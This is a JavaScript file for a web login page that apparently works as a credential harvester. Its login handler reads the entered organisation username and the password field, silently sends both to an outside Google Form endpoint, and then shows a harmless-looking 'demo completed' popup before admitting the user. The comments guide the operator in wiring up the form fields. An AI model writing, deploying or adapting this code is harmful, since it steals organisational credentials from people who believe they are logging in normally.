// ===== CONFIG =====
// Your Google Form POST URL (without viewform)
const FORM_URL =
  "https://docs.google.com/forms/d/e/1FAIpQLSewVJbVfyeTsgLx5WBdFvVc4vg16zS0JhkiTRlTH88iUFmhbw/formResponse";

// Real entry IDs from your pre-filled URL
const ENTRY_USERNAME = "entry.842584535";
const ENTRY_DEMO_CODE = "entry.588923101";

// If you have a 3rd field (Condition) and have its entry ID,
// replace the empty string below with that ID.
// If not, we’ll just send it as blank.
const ENTRY_CONDITION = "";

let currentUser = "";

// LOGIN HANDLER
function login() {
  const username = document.getElementById("username").value.trim();
  const demoCode = document.querySelector(
    'input[type="password"]'
  ).value.trim();

  // If you added a condition paragraph, capture it here:
  const conditionText =
    document.querySelector(".condition")?.innerText || "";

  if (!username) {
    alert("Please enter organisation username");
    return;
  }

  // Send data to Google Form
  fetch(FORM_URL, {
    method: "POST",
    mode: "no-cors",
    body: new URLSearchParams({
      [ENTRY_USERNAME]: username,
      [ENTRY_DEMO_CODE]: demoCode,
      [ENTRY_CONDITION]: conditionText
    })
  });

  currentUser = username;

  // Show demo completed popup
  document.getElementById("modal").classList.add("show");
}

function enterApp() {
  document.getElementById("modal").classList.remove("show");
  document.getElementById("login").classList.add("hidden");
  document.getElementById("app").classList.remove("hidden");
  document.getElementById("user").innerText = currentUser;
}

// PHOTO PREVIEW
document.getElementById("photo").addEventListener("change", function (e) {
  const file = e.target.files[0];
  if (!file) return;

  const preview = document.getElementById("preview");
  preview.src = URL.createObjectURL(file);
  preview.onload = () => URL.revokeObjectURL(preview.src);
});
